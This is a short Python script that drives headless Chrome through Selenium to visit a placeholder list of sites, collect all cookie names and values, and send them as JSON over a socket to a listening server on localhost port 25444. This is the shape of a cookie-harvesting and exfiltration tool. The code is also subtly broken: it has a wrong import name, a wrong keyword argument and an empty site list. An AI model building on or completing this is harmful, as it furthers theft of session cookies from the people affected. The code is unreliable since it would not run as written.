from selenium import webdriver
from selenium.webdriver.chrome.service import service
from selenium.webdriver.chrome.options import Options
import time
import socket
import json

def get_chrome_cookies():
    cookies = {}
    
    try:
        #Chrome Options
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-extensions')
        
        #Create Chrome driver
        driver = webdriver.Chrome(Options=chrome_options)
        
        #Visit sites
        sites = [
            #SITES
        ]
        
        for site in sites:
            try:
                driver.get(site)
                time.sleep(5)
                #Get cookies
                site_cookies = driver.get_cookies()
                for cookie in site_cookies:
                    cookie_name = cookie['name']
                    cookie_value = cookie['value']
                    cookies[cookie_name] = cookie_value
            except Exception as e:
                continue
    except Exception as e:
            return None

    finally:
        try:
            driver.quit()
        except:
            pass
    return cookies

def send_to_srv(cookies):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('localhost', 25444))
    client.sendall(json.dumps(cookies).encode('utf-8'))
    response = client.recv(1024)
    client.close()
    